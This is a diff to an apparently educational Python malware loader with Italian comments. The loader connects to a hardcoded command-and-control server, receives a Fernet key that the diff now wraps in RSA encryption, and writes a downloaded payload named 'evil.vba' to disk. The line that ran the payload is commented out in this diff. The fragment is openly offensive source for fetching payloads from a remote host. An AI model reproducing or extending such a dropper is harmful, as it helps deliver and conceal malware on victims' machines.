@@ -58,7 +58,7 @@ if __name__ == '__main__':
     #     print("Chiave di registro già presente")
 
     # connessione al server C2
-    ip_server = "127.0.0.1"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
+    ip_server = "192.168.43.208"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
     port_server = 65432
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("Tentativo di connessione al server C2...")
@@ -66,11 +66,16 @@ if __name__ == '__main__':
     print("Connessione al server C2 avvenuta con successo!")
     #path_real_malware_from_C2 = r"C:\Users\angel\Desktop\chrome_proxy.exe"
     # per Giordano: qui mettici pure l'indirizzo in cui vuoi che venga scaricato il malware che ti invia il server
-    path_real_malware_from_C2 = r"C:\Users\angel\Desktop\7zip.exe"
+    path_real_malware_from_C2 = r"C:\Users\angel\Desktop\evil.vba"
+
+    # genero la coppia di chiavi pubblica-privata
+    (publicKey, privateKey) = rsa.newkeys(1024)
+    server.send(pickle.dumps(publicKey))
+    server.recv(10)
 
     with open(path_real_malware_from_C2, "wb") as malware_from_C2:
         byte_key = server.recv(BUFFER_SIZE)
-        key = pickle.loads(byte_key)
+        key = rsa.decrypt(pickle.loads(byte_key), privateKey)
         symmetric_key = Fernet(key)
         print("Chiave simmetrica ricevuta: {}".format(str(byte_key)))
         bytes_read = b""
@@ -90,4 +95,4 @@ if __name__ == '__main__':
     print("Terminato!")
     server.close()
     # eseguo il malware
-    os.startfile(path_real_malware_from_C2)
+    #os.startfile(path_real_malware_from_C2)
